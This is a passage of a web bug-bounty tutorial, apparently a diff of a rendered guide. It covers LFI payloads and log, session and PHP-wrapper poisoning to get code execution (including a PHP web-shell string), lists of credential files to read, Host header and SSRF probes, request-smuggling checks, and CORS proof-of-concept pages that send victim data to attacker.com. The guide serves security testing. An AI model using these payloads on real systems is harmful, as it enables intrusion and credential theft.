+</span><span id="__span-36-9"><a id="__codelineno-36-9" name="__codelineno-36-9" href="#__codelineno-36-9"></a>..../....//
+</span><span id="__span-36-10"><a id="__codelineno-36-10" name="__codelineno-36-10" href="#__codelineno-36-10"></a>
+</span><span id="__span-36-11"><a id="__codelineno-36-11" name="__codelineno-36-11" href="#__codelineno-36-11"></a><span class="c1"># Absolute path (if filter only checks relative):</span>
+</span><span id="__span-36-12"><a id="__codelineno-36-12" name="__codelineno-36-12" href="#__codelineno-36-12"></a>?file<span class="o">=</span>/etc/passwd
+</span><span id="__span-36-13"><a id="__codelineno-36-13" name="__codelineno-36-13" href="#__codelineno-36-13"></a>
+</span><span id="__span-36-14"><a id="__codelineno-36-14" name="__codelineno-36-14" href="#__codelineno-36-14"></a><span class="c1"># Null byte (truncates extension check in old PHP):</span>
+</span><span id="__span-36-15"><a id="__codelineno-36-15" name="__codelineno-36-15" href="#__codelineno-36-15"></a>?file<span class="o">=</span>../../etc/passwd%00.jpg
+</span><span id="__span-36-16"><a id="__codelineno-36-16" name="__codelineno-36-16" href="#__codelineno-36-16"></a>
+</span><span id="__span-36-17"><a id="__codelineno-36-17" name="__codelineno-36-17" href="#__codelineno-36-17"></a><span class="c1"># Extra characters:</span>
+</span><span id="__span-36-18"><a id="__codelineno-36-18" name="__codelineno-36-18" href="#__codelineno-36-18"></a>?file<span class="o">=</span>../../etc/passwd.
+</span></code></pre></div>
+<hr />
+<h3 id="543-lfi-to-rce">5.4.3 LFI to RCE<a class="headerlink" href="#543-lfi-to-rce" title="Permanent link">&para;</a></h3>
+<p><strong>Log poisoning (Apache/Nginx):</strong></p>
+<div class="language-bash highlight"><span class="filename">log_poisoning.sh</span><pre><span></span><code><span id="__span-37-1"><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a><span class="c1"># Step 1: Inject PHP code via User-Agent:</span>
+</span><span id="__span-37-2"><a id="__codelineno-37-2" name="__codelineno-37-2" href="#__codelineno-37-2"></a>curl<span class="w"> </span>-s<span class="w"> </span><span class="s2">&quot;https://target.com/&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-37-3"><a id="__codelineno-37-3" name="__codelineno-37-3" href="#__codelineno-37-3"></a><span class="w">  </span>-H<span class="w"> </span><span class="s2">&quot;User-Agent: &lt;?php system(\$_GET[&#39;cmd&#39;]); ?&gt;&quot;</span>
+</span><span id="__span-37-4"><a id="__codelineno-37-4" name="__codelineno-37-4" href="#__codelineno-37-4"></a>
+</span><span id="__span-37-5"><a id="__codelineno-37-5" name="__codelineno-37-5" href="#__codelineno-37-5"></a><span class="c1"># Step 2: Include the log file:</span>
+</span><span id="__span-37-6"><a id="__codelineno-37-6" name="__codelineno-37-6" href="#__codelineno-37-6"></a>?file<span class="o">=</span>../../var/log/apache2/access.log<span class="p">&amp;</span><span class="nv">cmd</span><span class="o">=</span>id
+</span><span id="__span-37-7"><a id="__codelineno-37-7" name="__codelineno-37-7" href="#__codelineno-37-7"></a>
+</span><span id="__span-37-8"><a id="__codelineno-37-8" name="__codelineno-37-8" href="#__codelineno-37-8"></a><span class="c1"># Other log targets:</span>
+</span><span id="__span-37-9"><a id="__codelineno-37-9" name="__codelineno-37-9" href="#__codelineno-37-9"></a><span class="c1"># /var/log/nginx/access.log</span>
+</span><span id="__span-37-10"><a id="__codelineno-37-10" name="__codelineno-37-10" href="#__codelineno-37-10"></a><span class="c1"># /var/log/auth.log  (inject via failed SSH login)</span>
+</span><span id="__span-37-11"><a id="__codelineno-37-11" name="__codelineno-37-11" href="#__codelineno-37-11"></a><span class="c1"># /proc/self/fd/1</span>
+</span></code></pre></div>
+<p><strong>PHP wrappers:</strong></p>
+<div class="language-bash highlight"><span class="filename">php_wrappers.sh</span><pre><span></span><code><span id="__span-38-1"><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a><span class="c1"># Read PHP source (base64 encoded — bypasses code execution):</span>
+</span><span id="__span-38-2"><a id="__codelineno-38-2" name="__codelineno-38-2" href="#__codelineno-38-2"></a>?file<span class="o">=</span>php://filter/convert.base64-encode/resource<span class="o">=</span>index.php
+</span><span id="__span-38-3"><a id="__codelineno-38-3" name="__codelineno-38-3" href="#__codelineno-38-3"></a><span class="c1"># Decode the response → full PHP source including credentials</span>
+</span><span id="__span-38-4"><a id="__codelineno-38-4" name="__codelineno-38-4" href="#__codelineno-38-4"></a>
+</span><span id="__span-38-5"><a id="__codelineno-38-5" name="__codelineno-38-5" href="#__codelineno-38-5"></a><span class="c1"># Execute arbitrary code:</span>
+</span><span id="__span-38-6"><a id="__codelineno-38-6" name="__codelineno-38-6" href="#__codelineno-38-6"></a>?file<span class="o">=</span>data://text/plain,&lt;?php<span class="w"> </span>system<span class="o">(</span><span class="s1">&#39;id&#39;</span><span class="o">)</span><span class="p">;</span><span class="w"> </span>?&gt;
+</span><span id="__span-38-7"><a id="__codelineno-38-7" name="__codelineno-38-7" href="#__codelineno-38-7"></a>?file<span class="o">=</span>data://text/plain<span class="p">;</span>base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
+</span><span id="__span-38-8"><a id="__codelineno-38-8" name="__codelineno-38-8" href="#__codelineno-38-8"></a>
+</span><span id="__span-38-9"><a id="__codelineno-38-9" name="__codelineno-38-9" href="#__codelineno-38-9"></a><span class="c1"># ZIP wrapper (if you can upload a zip containing shell.php):</span>
+</span><span id="__span-38-10"><a id="__codelineno-38-10" name="__codelineno-38-10" href="#__codelineno-38-10"></a>?file<span class="o">=</span>zip:///uploads/malicious.zip%23shell.php
+</span></code></pre></div>
+<p><strong>PHP session poisoning:</strong></p>
+<div class="language-bash highlight"><span class="filename">session_poisoning.sh</span><pre><span></span><code><span id="__span-39-1"><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a><span class="c1"># Session files at: /var/lib/php/sessions/sess_&lt;session_id&gt;</span>
+</span><span id="__span-39-2"><a id="__codelineno-39-2" name="__codelineno-39-2" href="#__codelineno-39-2"></a><span class="c1"># Inject PHP into a session variable via any stored field:</span>
+</span><span id="__span-39-3"><a id="__codelineno-39-3" name="__codelineno-39-3" href="#__codelineno-39-3"></a><span class="c1"># Value: &lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;</span>
+</span><span id="__span-39-4"><a id="__codelineno-39-4" name="__codelineno-39-4" href="#__codelineno-39-4"></a>
+</span><span id="__span-39-5"><a id="__codelineno-39-5" name="__codelineno-39-5" href="#__codelineno-39-5"></a><span class="c1"># Then include the session file:</span>
+</span><span id="__span-39-6"><a id="__codelineno-39-6" name="__codelineno-39-6" href="#__codelineno-39-6"></a>?file<span class="o">=</span>../../var/lib/php/sessions/sess_abc123<span class="p">&amp;</span><span class="nv">cmd</span><span class="o">=</span>id
+</span></code></pre></div>
+<hr />
+<h3 id="544-high-value-file-targets">5.4.4 High-Value File Targets<a class="headerlink" href="#544-high-value-file-targets" title="Permanent link">&para;</a></h3>
+<p>Any file download or export endpoint that takes a filename parameter is worth testing:</p>
+<div class="language-bash highlight"><span class="filename">sensitive_file_targets.sh</span><pre><span></span><code><span id="__span-40-1"><a id="__codelineno-40-1" name="__codelineno-40-1" href="#__codelineno-40-1"></a><span class="c1"># Confirmation targets:</span>
+</span><span id="__span-40-2"><a id="__codelineno-40-2" name="__codelineno-40-2" href="#__codelineno-40-2"></a>/etc/passwd<span class="w">             </span><span class="c1"># root:x:0:0 = traversal confirmed</span>
+</span><span id="__span-40-3"><a id="__codelineno-40-3" name="__codelineno-40-3" href="#__codelineno-40-3"></a>/proc/self/environ<span class="w">      </span><span class="c1"># env vars — often contain DB passwords, API keys</span>
+</span><span id="__span-40-4"><a id="__codelineno-40-4" name="__codelineno-40-4" href="#__codelineno-40-4"></a>/proc/self/cmdline<span class="w">      </span><span class="c1"># running process command</span>
+</span><span id="__span-40-5"><a id="__codelineno-40-5" name="__codelineno-40-5" href="#__codelineno-40-5"></a>
+</span><span id="__span-40-6"><a id="__codelineno-40-6" name="__codelineno-40-6" href="#__codelineno-40-6"></a><span class="c1"># Credential targets:</span>
+</span><span id="__span-40-7"><a id="__codelineno-40-7" name="__codelineno-40-7" href="#__codelineno-40-7"></a>/app/config/database.yml
+</span><span id="__span-40-8"><a id="__codelineno-40-8" name="__codelineno-40-8" href="#__codelineno-40-8"></a>/var/www/html/config.php
+</span><span id="__span-40-9"><a id="__codelineno-40-9" name="__codelineno-40-9" href="#__codelineno-40-9"></a>/home/&lt;user&gt;/.aws/credentials
+</span><span id="__span-40-10"><a id="__codelineno-40-10" name="__codelineno-40-10" href="#__codelineno-40-10"></a>/root/.ssh/id_rsa
+</span><span id="__span-40-11"><a id="__codelineno-40-11" name="__codelineno-40-11" href="#__codelineno-40-11"></a>/root/.ssh/authorized_keys
+</span><span id="__span-40-12"><a id="__codelineno-40-12" name="__codelineno-40-12" href="#__codelineno-40-12"></a>/.env<span class="w">    </span>/app/.env
+</span><span id="__span-40-13"><a id="__codelineno-40-13" name="__codelineno-40-13" href="#__codelineno-40-13"></a>
+</span><span id="__span-40-14"><a id="__codelineno-40-14" name="__codelineno-40-14" href="#__codelineno-40-14"></a><span class="c1"># Windows:</span>
+</span><span id="__span-40-15"><a id="__codelineno-40-15" name="__codelineno-40-15" href="#__codelineno-40-15"></a>C:<span class="se">\W</span>indows<span class="se">\w</span>in.ini<span class="w">               </span><span class="c1"># traversal confirmed</span>
+</span><span id="__span-40-16"><a id="__codelineno-40-16" name="__codelineno-40-16" href="#__codelineno-40-16"></a>C:<span class="se">\i</span>netpub<span class="se">\w</span>wwroot<span class="se">\w</span>eb.config<span class="w">    </span><span class="c1"># .NET app config with credentials</span>
+</span></code></pre></div>
+<hr />
+<h2 id="55-host-header-injection">5.5 Host Header Injection<a class="headerlink" href="#55-host-header-injection" title="Permanent link">&para;</a></h2>
+<p>Beyond password reset poisoning (covered in Part 2), Host header injection enables two additional attack classes.</p>
+<h3 id="551-web-cache-poisoning">5.5.1 Web Cache Poisoning<a class="headerlink" href="#551-web-cache-poisoning" title="Permanent link">&para;</a></h3>
+<p>If a caching layer stores responses that include the Host header value in a link or script src, an attacker can poison the cache so other users receive a response containing the attacker's domain.</p>
+<div class="language-bash highlight"><span class="filename">cache_poisoning_test.sh</span><pre><span></span><code><span id="__span-41-1"><a id="__codelineno-41-1" name="__codelineno-41-1" href="#__codelineno-41-1"></a><span class="c1"># Does the response reflect the Host header?</span>
+</span><span id="__span-41-2"><a id="__codelineno-41-2" name="__codelineno-41-2" href="#__codelineno-41-2"></a>curl<span class="w"> </span>-sv<span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;Host: evil.com&quot;</span><span class="w"> </span>https://target.com/<span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-i<span class="w"> </span><span class="s2">&quot;evil.com&quot;</span>
+</span><span id="__span-41-3"><a id="__codelineno-41-3" name="__codelineno-41-3" href="#__codelineno-41-3"></a>
+</span><span id="__span-41-4"><a id="__codelineno-41-4" name="__codelineno-41-4" href="#__codelineno-41-4"></a><span class="c1"># Also test X-Forwarded-Host (often trusted by apps behind proxies):</span>
+</span><span id="__span-41-5"><a id="__codelineno-41-5" name="__codelineno-41-5" href="#__codelineno-41-5"></a>curl<span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;Host: target.com&quot;</span><span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;X-Forwarded-Host: evil.com&quot;</span><span class="w"> </span>https://target.com/
+</span><span id="__span-41-6"><a id="__codelineno-41-6" name="__codelineno-41-6" href="#__codelineno-41-6"></a>
+</span><span id="__span-41-7"><a id="__codelineno-41-7" name="__codelineno-41-7" href="#__codelineno-41-7"></a><span class="c1"># If reflected in script src, link href, or canonical URL:</span>
+</span><span id="__span-41-8"><a id="__codelineno-41-8" name="__codelineno-41-8" href="#__codelineno-41-8"></a><span class="c1"># &lt;script src=&quot;https://evil.com/static/app.js&quot;&gt;&lt;/script&gt;</span>
+</span><span id="__span-41-9"><a id="__codelineno-41-9" name="__codelineno-41-9" href="#__codelineno-41-9"></a><span class="c1"># And response is cached (X-Cache: HIT, Age: N) → cache poisoning confirmed</span>
+</span></code></pre></div>
+<h3 id="552-ssrf-via-host-header-routing">5.5.2 SSRF via Host Header Routing<a class="headerlink" href="#552-ssrf-via-host-header-routing" title="Permanent link">&para;</a></h3>
+<div class="language-bash highlight"><span class="filename">host_ssrf.sh</span><pre><span></span><code><span id="__span-42-1"><a id="__codelineno-42-1" name="__codelineno-42-1" href="#__codelineno-42-1"></a><span class="c1"># Some internal routing uses Host header to determine backend:</span>
+</span><span id="__span-42-2"><a id="__codelineno-42-2" name="__codelineno-42-2" href="#__codelineno-42-2"></a>curl<span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;Host: internal-app.internal:8080&quot;</span><span class="w"> </span>https://target.com/
+</span><span id="__span-42-3"><a id="__codelineno-42-3" name="__codelineno-42-3" href="#__codelineno-42-3"></a><span class="c1"># If app forwards based on Host → SSRF to internal service</span>
+</span><span id="__span-42-4"><a id="__codelineno-42-4" name="__codelineno-42-4" href="#__codelineno-42-4"></a>
+</span><span id="__span-42-5"><a id="__codelineno-42-5" name="__codelineno-42-5" href="#__codelineno-42-5"></a><span class="c1"># Absolute URL in request line (some proxy setups):</span>
+</span><span id="__span-42-6"><a id="__codelineno-42-6" name="__codelineno-42-6" href="#__codelineno-42-6"></a>GET<span class="w"> </span>http://169.254.169.254/latest/meta-data/<span class="w"> </span>HTTP/1.1
+</span><span id="__span-42-7"><a id="__codelineno-42-7" name="__codelineno-42-7" href="#__codelineno-42-7"></a>Host:<span class="w"> </span>target.com
+</span></code></pre></div>
+<hr />
+<h2 id="56-http-request-smuggling">5.6 HTTP Request Smuggling<a class="headerlink" href="#56-http-request-smuggling" title="Permanent link">&para;</a></h2>
+<p>Frontend (load balancer/CDN) and backend disagree on where one HTTP request ends and the next begins. An attacker smuggles a partial request that poisons the backend's buffer — prepending it to the next legitimate user's request.</p>
+<div class="admonition warning">
+<p class="admonition-title">Complexity</p>
+<p>Request smuggling is among the most technically complex web vulnerabilities. Complete all PortSwigger labs before attempting on live targets. This section covers safe detection and reporting.</p>
+</div>
+<h3 id="561-safe-detection">5.6.1 Safe Detection<a class="headerlink" href="#561-safe-detection" title="Permanent link">&para;</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-43-1"><a id="__codelineno-43-1" name="__codelineno-43-1" href="#__codelineno-43-1"></a>Variants:
+</span><span id="__span-43-2"><a id="__codelineno-43-2" name="__codelineno-43-2" href="#__codelineno-43-2"></a>  CL.TE — Frontend uses Content-Length, backend uses Transfer-Encoding
+</span><span id="__span-43-3"><a id="__codelineno-43-3" name="__codelineno-43-3" href="#__codelineno-43-3"></a>  TE.CL — Frontend uses Transfer-Encoding, backend uses Content-Length
+</span><span id="__span-43-4"><a id="__codelineno-43-4" name="__codelineno-43-4" href="#__codelineno-43-4"></a>  TE.TE — Both use TE but one can be obfuscated to ignore it
+</span></code></pre></div>
+<div class="language-http highlight"><span class="filename">clte_timing_probe</span><pre><span></span><code><span id="__span-44-1"><a id="__codelineno-44-1" name="__codelineno-44-1" href="#__codelineno-44-1"></a><span class="err"># CL.TE — backend waits for data that never arrives (~10 second hang):</span>
+</span><span id="__span-44-2"><a id="__codelineno-44-2" name="__codelineno-44-2" href="#__codelineno-44-2"></a><span class="nf">POST</span> <span class="nn">/</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</span><span id="__span-44-3"><a id="__codelineno-44-3" name="__codelineno-44-3" href="#__codelineno-44-3"></a><span class="na">Host</span><span class="o">:</span> <span class="l">target.com</span>
+</span><span id="__span-44-4"><a id="__codelineno-44-4" name="__codelineno-44-4" href="#__codelineno-44-4"></a><span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
+</span><span id="__span-44-5"><a id="__codelineno-44-5" name="__codelineno-44-5" href="#__codelineno-44-5"></a><span class="na">Content-Length</span><span class="o">:</span> <span class="l">4</span>
+</span><span id="__span-44-6"><a id="__codelineno-44-6" name="__codelineno-44-6" href="#__codelineno-44-6"></a><span class="na">Transfer-Encoding</span><span class="o">:</span> <span class="l">chunked</span>
+</span><span id="__span-44-7"><a id="__codelineno-44-7" name="__codelineno-44-7" href="#__codelineno-44-7"></a>
+</span><span id="__span-44-8"><a id="__codelineno-44-8" name="__codelineno-44-8" href="#__codelineno-44-8"></a><span class="err">1</span>
+</span><span id="__span-44-9"><a id="__codelineno-44-9" name="__codelineno-44-9" href="#__codelineno-44-9"></a><span class="err">A</span>
+</span><span id="__span-44-10"><a id="__codelineno-44-10" name="__codelineno-44-10" href="#__codelineno-44-10"></a><span class="err">X</span>
+</span></code></pre></div>
+<div class="admonition tip">
+<p class="admonition-title">HTTP Request Smuggler (BApp)</p>
+<p>Install from BApp Store. Right-click any request → Extensions → HTTP Request Smuggler → Smuggle Probe. Tests all variants safely and reports which type is present — use this instead of manual probing on live targets.</p>
+</div>
+<hr />
+<h2 id="57-cors-misconfiguration">5.7 CORS Misconfiguration<a class="headerlink" href="#57-cors-misconfiguration" title="Permanent link">&para;</a></h2>
+<p>Cross-Origin Resource Sharing controls which origins can read cross-origin responses. A misconfigured policy allows an attacker's site to make authenticated requests to the API and read the responses — leading to data theft or account takeover.</p>
+<p><strong>The critical condition:</strong> Both headers must be present to exploit:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-45-1"><a id="__codelineno-45-1" name="__codelineno-45-1" href="#__codelineno-45-1"></a>Access-Control-Allow-Origin: https://attacker.com   ← reflects attacker origin
+</span><span id="__span-45-2"><a id="__codelineno-45-2" name="__codelineno-45-2" href="#__codelineno-45-2"></a>Access-Control-Allow-Credentials: true              ← sends cookies cross-origin
+</span></code></pre></div>
+<h3 id="571-reflected-origin">5.7.1 Reflected Origin<a class="headerlink" href="#571-reflected-origin" title="Permanent link">&para;</a></h3>
+<div class="language-bash highlight"><span class="filename">cors_test.sh</span><pre><span></span><code><span id="__span-46-1"><a id="__codelineno-46-1" name="__codelineno-46-1" href="#__codelineno-46-1"></a>curl<span class="w"> </span>-sv<span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;Origin: https://attacker.com&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-46-2"><a id="__codelineno-46-2" name="__codelineno-46-2" href="#__codelineno-46-2"></a><span class="w">  </span>https://target.com/api/user/profile<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-46-3"><a id="__codelineno-46-3" name="__codelineno-46-3" href="#__codelineno-46-3"></a><span class="w">  </span>-H<span class="w"> </span><span class="s2">&quot;Cookie: session=&lt;your_token&gt;&quot;</span><span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-46-4"><a id="__codelineno-46-4" name="__codelineno-46-4" href="#__codelineno-46-4"></a><span class="w">  </span>grep<span class="w"> </span>-i<span class="w"> </span><span class="s2">&quot;access-control&quot;</span>
+</span><span id="__span-46-5"><a id="__codelineno-46-5" name="__codelineno-46-5" href="#__codelineno-46-5"></a>
+</span><span id="__span-46-6"><a id="__codelineno-46-6" name="__codelineno-46-6" href="#__codelineno-46-6"></a><span class="c1"># Vulnerable:</span>
+</span><span id="__span-46-7"><a id="__codelineno-46-7" name="__codelineno-46-7" href="#__codelineno-46-7"></a><span class="c1"># Access-Control-Allow-Origin: https://attacker.com</span>
+</span><span id="__span-46-8"><a id="__codelineno-46-8" name="__codelineno-46-8" href="#__codelineno-46-8"></a><span class="c1"># Access-Control-Allow-Credentials: true</span>
+</span></code></pre></div>
+<div class="language-html highlight"><span class="filename">cors_poc.html</span><pre><span></span><code><span id="__span-47-1"><a id="__codelineno-47-1" name="__codelineno-47-1" href="#__codelineno-47-1"></a><span class="cm">&lt;!-- Host at https://attacker.com/poc.html --&gt;</span>
+</span><span id="__span-47-2"><a id="__codelineno-47-2" name="__codelineno-47-2" href="#__codelineno-47-2"></a><span class="cm">&lt;!-- Victim visits this page → their profile data sent to attacker --&gt;</span>
+</span><span id="__span-47-3"><a id="__codelineno-47-3" name="__codelineno-47-3" href="#__codelineno-47-3"></a><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+</span><span id="__span-47-4"><a id="__codelineno-47-4" name="__codelineno-47-4" href="#__codelineno-47-4"></a><span class="nx">fetch</span><span class="p">(</span><span class="s1">&#39;https://target.com/api/user/profile&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-47-5"><a id="__codelineno-47-5" name="__codelineno-47-5" href="#__codelineno-47-5"></a><span class="w">  </span><span class="nx">credentials</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;include&#39;</span>
+</span><span id="__span-47-6"><a id="__codelineno-47-6" name="__codelineno-47-6" href="#__codelineno-47-6"></a><span class="p">})</span>
+</span><span id="__span-47-7"><a id="__codelineno-47-7" name="__codelineno-47-7" href="#__codelineno-47-7"></a><span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">r</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">r</span><span class="p">.</span><span class="nx">json</span><span class="p">())</span>
+</span><span id="__span-47-8"><a id="__codelineno-47-8" name="__codelineno-47-8" href="#__codelineno-47-8"></a><span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">data</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-47-9"><a id="__codelineno-47-9" name="__codelineno-47-9" href="#__codelineno-47-9"></a><span class="w">  </span><span class="nx">fetch</span><span class="p">(</span><span class="s1">&#39;https://attacker.com/steal?data=&#39;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">(</span><span class="nx">data</span><span class="p">))</span>
+</span><span id="__span-47-10"><a id="__codelineno-47-10" name="__codelineno-47-10" href="#__codelineno-47-10"></a><span class="p">})</span>
+</span><span id="__span-47-11"><a id="__codelineno-47-11" name="__codelineno-47-11" href="#__codelineno-47-11"></a><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></code></pre></div>
+<hr />
+<h3 id="572-null-origin-bypass">5.7.2 Null Origin Bypass<a class="headerlink" href="#572-null-origin-bypass" title="Permanent link">&para;</a></h3>
+<div class="language-bash highlight"><span class="filename">null_origin_test.sh</span><pre><span></span><code><span id="__span-48-1"><a id="__codelineno-48-1" name="__codelineno-48-1" href="#__codelineno-48-1"></a>curl<span class="w"> </span>-sv<span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;Origin: null&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-48-2"><a id="__codelineno-48-2" name="__codelineno-48-2" href="#__codelineno-48-2"></a><span class="w">  </span>https://target.com/api/data<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-48-3"><a id="__codelineno-48-3" name="__codelineno-48-3" href="#__codelineno-48-3"></a><span class="w">  </span>-H<span class="w"> </span><span class="s2">&quot;Cookie: session=&lt;token&gt;&quot;</span><span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-48-4"><a id="__codelineno-48-4" name="__codelineno-48-4" href="#__codelineno-48-4"></a><span class="w">  </span>grep<span class="w"> </span>-i<span class="w"> </span><span class="s2">&quot;access-control-allow-origin: null&quot;</span>
+</span></code></pre></div>
+<div class="language-html highlight"><span class="filename">null_origin_poc.html</span><pre><span></span><code><span id="__span-49-1"><a id="__codelineno-49-1" name="__codelineno-49-1" href="#__codelineno-49-1"></a><span class="cm">&lt;!-- sandbox attribute causes browser to send Origin: null --&gt;</span>
+</span><span id="__span-49-2"><a id="__codelineno-49-2" name="__codelineno-49-2" href="#__codelineno-49-2"></a><span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">sandbox</span><span class="o">=</span><span class="s">&quot;allow-scripts allow-top-navigation allow-forms&quot;</span>
+</span><span id="__span-49-3"><a id="__codelineno-49-3" name="__codelineno-49-3" href="#__codelineno-49-3"></a>  <span class="na">srcdoc</span><span class="o">=</span><span class="s">&quot;&lt;script&gt;</span>
+</span><span id="__span-49-4"><a id="__codelineno-49-4" name="__codelineno-49-4" href="#__codelineno-49-4"></a><span class="s">fetch(&#39;https://target.com/api/user&#39;, {credentials: &#39;include&#39;})</span>
+</span><span id="__span-49-5"><a id="__codelineno-49-5" name="__codelineno-49-5" href="#__codelineno-49-5"></a><span class="s">.then(r =&gt; r.text())</span>
+</span><span id="__span-49-6"><a id="__codelineno-49-6" name="__codelineno-49-6" href="#__codelineno-49-6"></a><span class="s">.then(d =&gt; top.location=&#39;https://attacker.com/steal?d=&#39;+encodeURIComponent(d))</span>
+</span><span id="__span-49-7"><a id="__codelineno-49-7" name="__codelineno-49-7" href="#__codelineno-49-7"></a><span class="s">&lt;/script&gt;&quot;</span><span class="p">&gt;</span>
+</span><span id="__span-49-8"><a id="__codelineno-49-8" name="__codelineno-49-8" href="#__codelineno-49-8"></a><span class="p">&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
+</span></code></pre></div>
+<hr />
+<h3 id="573-subdomain-bypass">5.7.3 Subdomain Bypass<a class="headerlink" href="#573-subdomain-bypass" title="Permanent link">&para;</a></h3>
+<div class="language-bash highlight"><span class="filename">subdomain_cors_test.sh</span><pre><span></span><code><span id="__span-50-1"><a id="__codelineno-50-1" name="__codelineno-50-1" href="#__codelineno-50-1"></a><span class="c1"># Test: does app allow subdomains?</span>
+</span><span id="__span-50-2"><a id="__codelineno-50-2" name="__codelineno-50-2" href="#__codelineno-50-2"></a>curl<span class="w"> </span>-sv<span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;Origin: https://evil.target.com&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-50-3"><a id="__codelineno-50-3" name="__codelineno-50-3" href="#__codelineno-50-3"></a><span class="w">  </span>https://target.com/api/sensitive<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-50-4"><a id="__codelineno-50-4" name="__codelineno-50-4" href="#__codelineno-50-4"></a><span class="w">  </span>-H<span class="w"> </span><span class="s2">&quot;Cookie: session=&lt;token&gt;&quot;</span><span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-50-5"><a id="__codelineno-50-5" name="__codelineno-50-5" href="#__codelineno-50-5"></a><span class="w">  </span>grep<span class="w"> </span><span class="s2">&quot;access-control-allow-origin&quot;</span>
+</span><span id="__span-50-6"><a id="__codelineno-50-6" name="__codelineno-50-6" href="#__codelineno-50-6"></a>
+</span><span id="__span-50-7"><a id="__codelineno-50-7" name="__codelineno-50-7" href="#__codelineno-50-7"></a><span class="c1"># If wildcard subdomain allowed + XSS on any subdomain:</span>
+</span><span id="__span-50-8"><a id="__codelineno-50-8" name="__codelineno-50-8" href="#__codelineno-50-8"></a><span class="c1"># → XSS on sub.target.com</span>
+</span><span id="__span-50-9"><a id="__codelineno-50-9" name="__codelineno-50-9" href="#__codelineno-50-9"></a><span class="c1"># → Credentialed fetch to target.com/api/ (allowed because same registrable domain)</span>
+</span><span id="__span-50-10"><a id="__codelineno-50-10" name="__codelineno-50-10" href="#__codelineno-50-10"></a><span class="c1"># → Full data exfiltration — combine XSS + CORS for maximum impact</span>
+</span></code></pre></div>
+<p><strong>What CORS misconfiguration can expose:</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-51-1"><a id="__codelineno-51-1" name="__codelineno-51-1" href="#__codelineno-51-1"></a>GET /api/user/me        → PII, email, address
+</span><span id="__span-51-2"><a id="__codelineno-51-2" name="__codelineno-51-2" href="#__codelineno-51-2"></a>GET /api/tokens         → API keys, OAuth tokens
+</span><span id="__span-51-3"><a id="__codelineno-51-3" name="__codelineno-51-3" href="#__codelineno-51-3"></a>GET /api/settings       → security settings, connected accounts
+</span><span id="__span-51-4"><a id="__codelineno-51-4" name="__codelineno-51-4" href="#__codelineno-51-4"></a>GET /api/payments       → payment methods
+</span></code></pre></div>
+<hr />
+<h2 id="part-5-complete-checklist">Part 5 Complete Checklist<a class="headerlink" href="#part-5-complete-checklist" title="Permanent link">&para;</a></h2>
+<details class="note">
+<summary>Expand full checklist</summary>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-52-1"><a id="__codelineno-52-1" name="__codelineno-52-1" href="#__codelineno-52-1"></a>SSRF
+</span><span id="__span-52-2"><a id="__codelineno-52-2" name="__codelineno-52-2" href="#__codelineno-52-2"></a>□ Every URL/uri/src/link/webhook parameter → interactsh callback
+</span><span id="__span-52-3"><a id="__codelineno-52-3" name="__codelineno-52-3" href="#__codelineno-52-3"></a>□ Import features, avatar URLs, document generators, link preview
+</span><span id="__span-52-4"><a id="__codelineno-52-4" name="__codelineno-52-4" href="#__codelineno-52-4"></a>□ Confirmed SSRF → AWS/GCP/Azure metadata endpoints immediately
+</span><span id="__span-52-5"><a id="__codelineno-52-5" name="__codelineno-52-5" href="#__codelineno-52-5"></a>□ Filter bypass: decimal IP, hex IP, IPv6, DNS via nip.io, redirect chain
+</span><span id="__span-52-6"><a id="__codelineno-52-6" name="__codelineno-52-6" href="#__codelineno-52-6"></a>□ Protocols: file://, gopher://, dict:// if HTTP blocked
